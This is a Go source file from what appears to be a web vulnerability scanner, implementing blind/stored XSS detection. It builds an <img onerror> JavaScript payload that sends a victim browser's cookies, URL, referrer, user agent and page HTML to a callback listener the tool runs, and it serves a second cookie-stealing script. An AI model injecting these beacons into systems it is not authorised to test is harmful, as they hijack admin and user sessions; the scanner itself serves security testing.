package scanner

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"ssghost666/internal/httpclient"
	"ssghost666/internal/model"
	"ssghost666/internal/ratelimiter"
)

// --- Blind (stored) XSS -----------------------------------------------------
//
// Unlike the reflected-XSS check (xss.go), which looks at the immediate
// response, blind/stored XSS only executes later — when an admin or
// another user views the page where the payload was stored. There is
// nothing to see in the response, so the only reliable signal is an
// out-of-band callback from the victim's browser. The payload injected
// here points at BlindXSSListener, a small local HTTP server that both
// serves the JavaScript to fire the callback and records when it does.

// blindXSSParamHints are parameter-name substrings that commonly end up
// stored and later rendered into a page (profile fields, comments,
// names). Blind XSS is worth trying wherever user input is persisted.
var blindXSSParamHints = []string{
	"name", "user", "email", "comment", "message", "title", "subject",
	"content", "body", "text", "desc", "description", "note", "bio",
	"about", "address", "phone", "company", "author", "nickname", "field",
	"value", "input", "feedback", "review", "signature", "display",
}

func looksLikeStorableParam(name string) bool {
	low := strings.ToLower(name)
	for _, hint := range blindXSSParamHints {
		if strings.Contains(low, hint) {
			return true
		}
	}
	return false
}

// CheckBlindXSS injects a callback beacon containing a unique marker into
// a parameter and immediately polls the listener once. Most stored XSS is
// only triggered when someone (an admin) later views the stored content,
// so a non-zero delay is expected and normal; confirmed callbacks surface
// live through the listener while the rest of the scan proceeds, and any
// remaining hits are reported in the run's final callback sweep.
//
// register, when non-nil, is called with the marker and injection context
// so the caller can map a later callback back to its origin.
func CheckBlindXSS(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, t model.Target, p model.Param, listener *BlindXSSListener, register func(marker string, c blindXSSCorrelation)) []model.Finding {
	if listener == nil || !looksLikeStorableParam(p.Name) {
		return nil
	}

	marker := "bxss" + Marker()[3:]
	payload := blindXSSPayload(listener.callbackBase(), marker)

	if register != nil {
		register(marker, blindXSSCorrelation{target: t, param: p, payload: payload})
	}

	sendWithPayload(ctx, lim, cli, t, p.Name, payload)

	// Give an immediately-triggered render (reflected into a live page,
	// or a fast server-side previewer) a brief chance to fire before we
	// move on; slower triggers are caught by the final sweep.
	time.Sleep(800 * time.Millisecond)
	if hit := listener.CheckHit(marker); hit != nil {
		return []model.Finding{blindXSSFinding(t, p, payload, hit)}
	}
	return nil
}

// blindXSSSweep is called once at the end of a run to collect any delayed
// callbacks that arrived after their injection check had already moved on.
func blindXSSSweep(correlations map[string]blindXSSCorrelation, listener *BlindXSSListener) []model.Finding {
	if listener == nil {
		return nil
	}
	var findings []model.Finding
	for marker, c := range correlations {
		if hit := listener.CheckHit(marker); hit != nil {
			findings = append(findings, blindXSSFinding(c.target, c.param, c.payload, hit))
		}
	}
	return findings
}

func blindXSSFinding(t model.Target, p model.Param, payload string, hit *BlindXSSHit) model.Finding {
	return model.Finding{
		Category:    "Blind (Stored) XSS",
		Severity:    model.SeverityCritical,
		Title:       "Confirmed blind/stored XSS via parameter \"" + p.Name + "\"",
		Description: fmt.Sprintf("A callback beacon injected into %q was later executed by a browser and connected back to SSGhost666 from %s. This confirms the injected script was stored server-side and rendered into a page a browser executed — characteristic of stored XSS that triggers when an admin or other user views the content.", p.Name, hit.RemoteIP),
		URL:         t.URL,
		Method:      t.Method,
		Parameter:   p.Name,
		Evidence:    model.Evidence{RequestRaw: payloadRequestNote(payload), Notes: blindXSSNotes(hit)},
		Remediation: "Store user input as data and HTML-escape it on output (context-aware escaping via an auto-escaping template engine). Add a strict Content-Security-Policy and consider HttpOnly cookies so a stored payload can't read session tokens.",
	}
}

// payloadRequestNote keeps the injected payload visible in the report even
// though the request that carried it may have happened much earlier.
func payloadRequestNote(payload string) string {
	return "Blind-XSS callback payload injected into the parameter:\n" + payload
}

func blindXSSNotes(hit *BlindXSSHit) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Callback from %s (%s) at %s\n", hit.RemoteIP, hit.UserAgent, hit.Timestamp.Format(time.RFC3339))
	fmt.Fprintf(&b, "Referer: %s\nCookie: %s\n", hit.Referer, hit.Cookies)
	if hit.URL != "" {
		fmt.Fprintf(&b, "Executed on page: %s\n", hit.URL)
	}
	return b.String()
}

// blindXSSPayload builds the injected beacon. It sits inside an <img> with
// an invalid src so onerror fires, then calls the listener's collector
// endpoint with the marker and everything a browser-exposed attacker would
// want to know (cookies, current URL, referer, user-agent, page HTML). The
// payload is deliberately split so the literal string "</script>" never
// appears, keeping it safe to inject inside a <script> block too.
func blindXSSPayload(base, marker string) string {
	collect := base + "/c?ssgb=" + marker
	js := `(function(){try{` +
		`var d=document,c=encodeURIComponent;` +
		`var u=` + jsStr(collect) +
		`+c("&d="+d.domain)` +
		`+c("&u="+c(d.URL))` +
		`+c("&r="+c(d.referrer))` +
		`+c("&c="+c(d.cookie||""))` +
		`+c("&ua="+c(navigator.userAgent))` +
		`+c("&h="+c((d.documentElement.innerHTML||"").slice(0,1500)));` +
		`(new Image()).src=u;` +
		`}catch(e){}})()`
	// No single-quote characters in the JS, so the attribute can be
	// single-quoted and the whole thing also survives inside a JS string.
	return `<img src=x onerror='` + js + `'>`
}

// jsStr renders s as a single-quoted JS string literal. The URL is built
// entirely from the listener address and a marker of lowercase
// letters/digits, so no escaping beyond that alphabet is required.
func jsStr(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `\'`) + "'"
}

// --- Blind XSS callback listener --------------------------------------------

// BlindXSSListener is a small local HTTP server that serves the blind-XSS
// beacon and records when a victim's browser executes it. It has two
// responsibilities:
//
//   - /j/<marker>      serves JavaScript that fires the callback (usable
//     where only a script URL can be injected)
//   - /c?...&ssgb=...  the collector: records a hit keyed by the marker
//
// The beacon is a cross-origin image request, which no realistic CSP
// blocks by default, so a stored payload that merely reaches the DOM is
// usually enough to confirm execution.
type BlindXSSListener struct {
	Port     int
	server   *http.Server
	hits     map[string]*BlindXSSHit
	hitsMu   sync.RWMutex
	listener net.Listener
	started  bool
	base     string // routable http://<ip>:<port> advertised in payloads
	onHit    func(marker string, hit *BlindXSSHit)
}

// BlindXSSHit is one recorded callback execution.
type BlindXSSHit struct {
	Marker    string
	Timestamp time.Time
	RemoteIP  string
	UserAgent string
	Referer   string
	Cookies   string
	Domain    string
	URL       string
	Body      string // page HTML snapshot the beacon sent
}

// NewBlindXSSListener creates a callback listener. port 0 auto-selects.
func NewBlindXSSListener(port int) (*BlindXSSListener, error) {
	return &BlindXSSListener{
		Port: port,
		hits: make(map[string]*BlindXSSHit),
	}, nil
}

// OnHit registers a callback fired the moment a beacon executes, so a
// finding can be surfaced live mid-scan rather than only in the final
// sweep.
func (bl *BlindXSSListener) OnHit(f func(marker string, hit *BlindXSSHit)) { bl.onHit = f }

// Start begins listening and returns the routable base URL (without
// scheme) that injected payloads should point at.
func (bl *BlindXSSListener) Start() (string, error) {
	if bl.started {
		return "", fmt.Errorf("listener already started")
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/j/", bl.handleJS)
	mux.HandleFunc("/c", bl.handleCollect)
	mux.HandleFunc("/", bl.handleCollect)

	bl.server = &http.Server{
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
	}
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", bl.Port))
	if err != nil {
		return "", fmt.Errorf("failed to start blind-XSS listener: %w", err)
	}
	bl.listener = ln
	bl.Port = ln.Addr().(*net.TCPAddr).Port
	bl.started = true
	bl.base = fmt.Sprintf("http://%s:%d", getLocalIP(), bl.Port)

	go func() {
		if err := bl.server.Serve(ln); err != nil && err != http.ErrServerClosed {
			log.Printf("blind-XSS listener error: %v", err)
		}
	}()
	return bl.base, nil
}

// callbackBase returns the routable base URL, falling back to the bind
// address if Start has not been called.
func (bl *BlindXSSListener) callbackBase() string {
	if bl.base != "" {
		return bl.base
	}
	if bl.listener != nil {
		return "http://" + bl.listener.Addr().String()
	}
	return ""
}

// handleJS serves an unconditional beacon as JavaScript, for injection
// points where only a script URL fits.
func (bl *BlindXSSListener) handleJS(w http.ResponseWriter, r *http.Request) {
	marker := strings.Trim(strings.TrimPrefix(r.URL.Path, "/j/"), "/")
	collect := bl.callbackBase() + "/c?ssgb=" + marker
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	io.WriteString(w, `(function(){try{var d=document,c=encodeURIComponent;`+
		`(new Image()).src=`+jsStr(collect)+`+c("&d="+d.domain)+c("&c="+c(d.cookie||""));}catch(e){}})();`)
}

// handleCollect records a beacon hit. The marker travels in the ssgb query
// parameter; everything else is browser context the beacon volunteered.
func (bl *BlindXSSListener) handleCollect(w http.ResponseWriter, r *http.Request) {
	_ = r.ParseForm()
	marker := r.Form.Get("ssgb")
	if marker == "" {
		marker = strings.Trim(r.URL.Path, "/")
	}
	body, _ := io.ReadAll(io.LimitReader(r.Body, 64*1024))
	defer r.Body.Close()

	remoteIP := r.RemoteAddr
	if idx := strings.LastIndex(remoteIP, ":"); idx > 0 {
		remoteIP = remoteIP[:idx]
	}

	hit := &BlindXSSHit{
		Marker:    marker,
		Timestamp: time.Now(),
		RemoteIP:  remoteIP,
		UserAgent: r.UserAgent(),
		Referer:   r.Referer(),
		Cookies:   r.Form.Get("c"),
		Domain:    r.Form.Get("d"),
		URL:       r.Form.Get("u"),
		Body:      string(body),
	}
	if hit.URL == "" {
		hit.URL = r.Form.Get("u")
	}

	bl.hitsMu.Lock()
	_, existed := bl.hits[marker]
	bl.hits[marker] = hit
	bl.hitsMu.Unlock()
	if !existed && bl.onHit != nil {
		bl.onHit(marker, hit)
	}

	// 1x1 transparent GIF so the <img> beacon completes cleanly.
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Write([]byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00,
		0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01,
		0x00, 0x3b})
}

// CheckHit returns the recorded hit for a marker, or nil.
func (bl *BlindXSSListener) CheckHit(marker string) *BlindXSSHit {
	bl.hitsMu.RLock()
	defer bl.hitsMu.RUnlock()
	return bl.hits[marker]
}

// HitCount returns how many distinct beacons have executed so far.
func (bl *BlindXSSListener) HitCount() int {
	bl.hitsMu.RLock()
	defer bl.hitsMu.RUnlock()
	return len(bl.hits)
}

// Stop gracefully shuts down the listener.
func (bl *BlindXSSListener) Stop() error {
	if !bl.started {
		return nil
	}
	bl.started = false
	if bl.server != nil {
		return bl.server.Close()
	}
	return nil
}

// blindXSSCorrelation records what a given marker was injected into, so a
// delayed callback can still be mapped back to its target/parameter.
type blindXSSCorrelation struct {
	target  model.Target
	param   model.Param
	payload string
}
